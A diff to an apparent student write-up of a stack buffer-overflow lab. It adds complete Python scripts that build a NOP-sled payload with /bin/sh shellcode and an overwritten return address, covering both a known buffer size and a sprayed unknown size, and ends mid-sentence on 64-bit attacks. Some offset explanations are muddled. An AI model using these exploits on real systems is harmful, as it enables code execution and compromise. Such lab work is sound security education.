@@ -417,13 +417,14 @@ Now we can get the required values needed to prepare the exploit by running gdb
 **image**
 
 ```
-the return address is stored in &buffer + 4
-thus the first address we can jump to is &buffer + 8 (this is the memory region that will be filled with NOPs).
-This then becomes the value for our return address.
+the stack is built from high address to low address (top to bottom)
+the return address is stored in $ebp + 4
+this means that the return address is stored in &buffer + (&buffer - $ebp) + 4
+the return address value must contain a value that will jump straight to our shellcode.
 
-likewise, we can get the differnce between $ebp and &buffer ($ebp - &buffer).
-This means that the return address is stored in $ebp + ($ebp - &buffer) + 4.
-Thus the first address we can jump to is $ebp + ($ebp - &buffer) + 8.
+Thus, for our exploit to work, we have to replace the return address stored in ($ebp + 4) to a value that will jump straight to our shellcode. But we do not know the address value where our shellcode is stored. To remedy this, we fill the whole buffer? with NOPs so that as long as we can jump to an NOP, we will surely get to our shellcode.
+
+NOPs are used to indicate that no action should be taken at a particular point in the program, but rather advance the program.
 ```
 
 Thus the following code can be used to exploit the buffer-overflow vulnerability (Note: address randomization is disabled)
@@ -432,7 +433,7 @@ Thus the following code can be used to exploit the buffer-overflow vulnerability
 #!/usr/bin/python3
 import sys
 
-# Replace the content with the actual shellcode
+# the actual shellcode
 shellcode= (
    "\xeb\x15\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b"
    "\x08\x31\xd2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff\x2f\x62\x69\x6e"
@@ -444,16 +445,20 @@ shellcode= (
 content = bytearray(0x90 for i in range(517)) 
 
 ##################################################################
-# Put the shellcode somewhere in the payload
-start = 517 - len(shellcode)               # Change this number 
-content[start:start + len(shellcode)] = shellcode
+# Put the shellcode at the end of the payload
+start = 517 - len(shellcode)
+content[start:] = shellcode
 
-# Decide the return address value 
-# and put it somewhere in the payload
-ret    = 0xffffcb38 + 130           # Change this number 
-offset = 112              # Change this number 
-
+##################################################################
+# Record the address values of $ebp, &buffer, and byte size
+ebp = 0xffffcb68
+buffer = 0xffffcafc
 L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+
+# Decide the return address value and place it in the payload
+ret    = buffer + (ebp - buffer) + 100           # or 'ret = ebp + 80' (we might need to adjust '80')
+offset = (ebp - buffer) + L                      # place 'ret' after $ebp 
+
 content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
 ##################################################################
 
@@ -464,16 +469,47 @@ with open('badfile', 'wb') as f:
 
 <details>
 <summary>Brief explanation of exploit code</summary>
-###
+
+The vulnerable program reads the first 517bytes from a file. Thus the aim of the exploit code is to produce a file that is only 517bytes and fill it with NOPs. This will form the base for exploit.
+
+```python
+content = bytearray(0x90 for i in range(517)) 
+```
+
+Next we need to place the shellcode at the end of the file so that we can jump to with by jumping to any NOP region. The more the NOP region, the better our chance of reaching the shellcode
+
+```python
+start = 517 - len(shellcode)
+content[start:] = shellcode
+```
+
+We also need to replace the original return address with a return address that will jump to an NOP region. Since we were able to get the values of `$ebp` and `&buffer`, we can calculate exactly the offset where the original return address is stored (this after `$ebp`). Thus the offset can be calculated with (`&buffer` - `$ebp` + 4). We need to calculate a new return address that we will place in `$ebp` + 4. This return address will have to be greater than `$ebp`, thus the new return address will be the `$ebp` address plus some number of bytes offset. We would need to adjust this number till the address points to an NOP region.
+
+```python
+ret    = buffer + (ebp - buffer) + 100
+offset = (ebp - buffer) + L
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
+```
+
+Finally with the exploit set, we write it to the file where the vulnerable program gets input from
+```python
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
 </details>
 
+**image**
 
 <br>
 
 ###  Launching Attack without Knowing Buffer Size (Level 2)
 
-Some times, we will not be able to get a copy of the binary or source code. This means that we will not be able to use gdb to derive the buffer size
-e assume that you do know the range of the buffer size, which is from 100 to 200 bytes. Another fact that may be useful to you is that, due to the memory alignment, the value stored in the frame pointer is always multiple of four (for 32-bit programs).
+Let us assume that we do not know the actual buffer size, but we do know the range of the buffer size, which is from 100 to 200 bytes. Using gdb, we can obtain the buffer address but that is all we would use gdb for.
+
+**image**
+
+The following code can be used to exploit the buffer-overflow vulnerability (Note: address randomization is disabled)
 
 ```python
 #!/usr/bin/python3
@@ -491,16 +527,19 @@ shellcode= (
 content = bytearray(0x90 for i in range(517)) 
 
 ##################################################################
-# Put the shellcode somewhere in the payload
-start = 517 - len(shellcode)               # Change this number 
-content[start:start + len(shellcode)] = shellcode
+# Put the shellcode at the end of the payload
+start = 517 - len(shellcode)               
+content[start:] = shellcode
 
-# Decide the return address value and put it somewhere in the payload
-max_buffs = 200 + 20                      # We know that the buffer is within the range of 100 to 200.
-                                          # Thus we add some bytes to account for additional space.
-ret    = 0xffffcb38 + max_buffs           # This number should be larger than the known buffer size
-
+##################################################################
+# Record the values of &buffer and byte size
+buffer = 0xffffca90
 L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+max_buffs = 200                                 # We know that the buffer is within the range of 100 to 200.
+
+##################################################################
+# Decide the return address value and place it in the payload
+ret = buffer + max_buffs + 100                  # Return address should point to one of the NOPs region.
 
 # Spray the first max_buffs
 for _ in range(0, max_buffs + L, L):
@@ -514,12 +553,54 @@ with open('badfile', 'wb') as f:
 
 <details>
 <summary>Brief explanation of exploit code</summary>
-###
+
+The vulnerable program reads the first 517bytes from a file. Thus the aim of the exploit code is to produce a file that is only 517bytes and fill it with NOPs. This will form the base for exploit.
+
+```python
+content = bytearray(0x90 for i in range(517)) 
+```
+
+Next we need to place the shellcode at the end of the file so that we can jump to with by jumping to any NOP region. The more the NOP region, the better our chance of reaching the shellcode
+
+```python
+start = 517 - len(shellcode)
+content[start:] = shellcode
+```
+
+We also need to replace the original return address with a return address that will jump to an NOP region. Since we know the buffer address, we can fill every region from the start of the buffer address to above (buffer_address + max_buffer_size). This way, we are sure to overwrite the original return address with a value that points to an NOP region.
+To achieve this, we spray the value of the new return address from begging of buffer till above max buffer size.
+
+```python
+ret = buffer + max_buffs + 100
+
+for _ in range(0, max_buffs + L, L):
+    content[_:_ + L] = (ret).to_bytes(L,byteorder='little') 
+```
+
+Finally with the exploit set, we write it to the file where the vulnerable program gets input from
+```python
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
 </details>
 
+**image**
 
+### Launching Attack on 64-bit Program
 
-
+In this task, we will compile the vulnerable program into a 64-bit binary called stack-L3. We will launch
+attacks on this program. The compilation and setup commands are already included in Makefile. Similar
+to the previous task, detailed explanation of your attack needs to be provided in the lab report.
+Using gdb to conduct an investigation on 64-bit programs is the same as that on 32-bit programs. The
+only difference is the name of the register for the frame pointer. In the x86 architecture, the frame pointer is
+ebp, while in the x64 architecture, it is rbp.
+Challenges. Compared to buffer-overflow attacks on 32-bit machines, attacks on 64-bit machines is more
+difficult. The most difficult part is the address. Although the x64 architecture supports 64-bit address space,
+only the address from 0x00 through 0x00007FFFFFFFFFFF is allowed. That means for every address
+(8 bytes), the highest two bytes are always zeros. This causes a problem.
+In our buffer-overflow attacks, we need to store at least one address in the payload, and the payload will
+be copied into the stack via strcpy(). We know that the strcpy() function will stop copying when
 
 
 
